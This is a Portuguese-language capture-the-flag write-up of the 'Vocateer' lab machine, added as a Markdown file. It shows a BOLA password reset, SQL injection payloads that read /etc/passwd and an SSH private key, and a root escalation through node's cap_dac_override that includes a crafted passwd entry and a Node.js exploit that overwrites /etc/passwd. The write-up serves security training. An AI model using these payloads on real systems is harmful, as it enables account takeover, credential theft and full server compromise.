@@ -1,0 +1,173 @@
+---
+title: 'Vocateer Writeup'
+date: '2025-01-04'
+tags: ['BOLA', 'SQLI', 'Linux', 'Hacking Club']
+draft: false
+summary: 'Máquina sobre Broken Access Control, BOLA, SQL Injection e linux capabilities.'
+images: ['/static/images/vocateer-writeup-images/default.png']
+authors: ['default']
+---
+
+![logo](/static/images/vocateer-writeup-images/default.png)
+
+---
+
+### Port Scanning
+
+`nmap -sC -sV -p- -v $IP --open -T 5`
+
+![vocateer](/static/images/vocateer-writeup-images/image.png)
+
+Somente as portas 22 (SSH), 80 (HTTP) e 3000 (Node.js) estão abertas.
+
+---
+
+## Enumeration
+
+`http://172.16.5.196`
+
+![vocateer 1](/static/images/vocateer-writeup-images/image1.png)
+
+Precisamos adicionar o endereço no nosso arquivo de configuração de hosts.
+
+`sudo vim /etc/hosts`
+
+![vocateer 2](/static/images/vocateer-writeup-images/image2.png)
+
+Agora podemos acessar a aplicação:
+
+![vocateer 3](/static/images/vocateer-writeup-images/image3.png)
+
+Após criarmos nossa conta em `Create account` e logar na aplicação, podemos ver que um JWT está sendo utilizado como Cookie de sessão.
+
+![vocateer 4](/static/images/vocateer-writeup-images/image4.png)
+
+Ao analisar o JWT, podemos ver que nossa conta está como `‘free’`, e só podemos nos candidatar as vagas de emprego se tivermos acesso ao premium da plataforma.
+
+https://jwt.io/
+
+![vocateer 5](/static/images/vocateer-writeup-images/image5.png)
+
+A aplicação também possui uma funcionalidade de trocar de senha.
+
+![vocateer 6](/static/images/vocateer-writeup-images/image6.png)
+
+Após trocar a senha e interceptar a requisição, podemos ver que ele faz uma requisição a API da aplicação.
+
+![vocateer 7](/static/images/vocateer-writeup-images/image7.png)
+
+Se de alguma forma conseguirmos acesso aos usuários da aplicação, podemos testar a vulnerabilidade BOLA (Broken Object Level Authorization), para tentar trocar a senha de outro usuário.
+
+Normalmente as APIs possuem rotas como `/api/users` , `/api/v1/users` ou `/api/v2/users` que acabam listando os usuários.
+
+Ao fazer a requisição para a rota `/api/users` podemos ver o ID do usuário `clopez`, que possui a role premium, vamos trocar a senha dele.
+
+![vocateer 8](/static/images/vocateer-writeup-images/image8.png)
+
+![vocateer 9](/static/images/vocateer-writeup-images/image9.png)
+
+Agora temos acesso a funcionalidade de aplicar para as vagas de emprego.
+
+![vocateer 10](/static/images/vocateer-writeup-images/image10.png)
+
+Após clicar em `Apply Now` e interceptar a requisição, podemos ver que uma delas é pra rota `/api/jobs` , e quando passamos uma aspas simples na requisição, a aplicação retorna um código 500 (Internal Server Error), indicando um possível SQL Injection.
+
+![vocateer 11](/static/images/vocateer-writeup-images/image11.png)
+
+![vocateer 12](/static/images/vocateer-writeup-images/image12.png)
+
+`a' UNION SELECT 1,2,3 #`
+
+OBS: lembre-se de encodar a payload em URL-encode all characters
+
+![vocateer 13](/static/images/vocateer-writeup-images/image13.png)
+
+![vocateer 14](/static/images/vocateer-writeup-images/image14.png)
+
+SQL Injection confirmado 😀
+
+Com isso, podemos utilizar a função `LOAD_FILE()` para ler arquivos do servidor, por exemplo o `/etc/passwd`
+
+`a' UNION SELECT 1, LOAD_FILE ('/etc/passwd'),3 #`
+
+![vocateer 15](/static/images/vocateer-writeup-images/image15.png)
+
+---
+
+## Foot Hold
+
+Como a maquina possui um servidor ssh aberto, podemos tentar ler a chave ssh do usuário `roger`, que achamos no arquivo `/etc/passwd`
+
+`a' UNION SELECT 1, LOAD_FILE ('/home/roger/.ssh/id_rsa'),3 #`
+
+![vocateer 16](/static/images/vocateer-writeup-images/image16.png)
+
+```jsx
+echo "chave ssh" > id_rsa
+chmod 600 id_rsa
+ssh roger@IP -i id_rsa
+```
+
+![vocateer 17](/static/images/vocateer-writeup-images/image17.png)
+
+![vocateer 18](/static/images/vocateer-writeup-images/image18.png)
+
+---
+
+## Privillege Escalation
+
+Binário `/usr/bin/node` com a Capability `cap_dac_override` que nos permite sobrescrever qualquer arquivo do servidor.
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+![vocateer 19](/static/images/vocateer-writeup-images/image19.png)
+
+Com isso, podemos adicionar um novo usuário como root no sistema a partir do arquivo `/etc/passwd`
+
+```jsx
+cp /etc/passwd .
+openssl passwd -1
+
+# adicionei meu usuário como root na ultima linha
+talon:$1$8C768ERL$H29rFHRyekRriZwML6bOO.:0:0:root:/root:/bin/bash
+```
+
+![vocateer 20](/static/images/vocateer-writeup-images/image20.png)
+
+Após isso, precisamos sobrescrever o arquivo passwd original, utilizei um exploit em JavaScript para isso.
+
+`exploit.js`
+
+```jsx
+const fs = require('fs')
+const path = require('path')
+
+const localPasswdPath = path.join(__dirname, 'passwd')
+const systemPasswdPath = '/etc/passwd'
+
+fs.readFile(localPasswdPath, 'utf8', (err, data) => {
+  if (err) {
+    console.error('Erro ao ler o arquivo passwd local:', err.message)
+    process.exit(1)
+  }
+
+  fs.writeFile(systemPasswdPath, data, (err) => {
+    if (err) {
+      console.error('Erro ao sobrescrever o arquivo /etc/passwd:', err.message)
+      process.exit(1)
+    }
+
+    console.log('Arquivo /etc/passwd sobrescrito com sucesso!')
+  })
+})
+```
+
+![vocateer 21](/static/images/vocateer-writeup-images/image21.png)
+
+---
+
+## Proof
+
+![vocateer 22](/static/images/vocateer-writeup-images/image22.png)
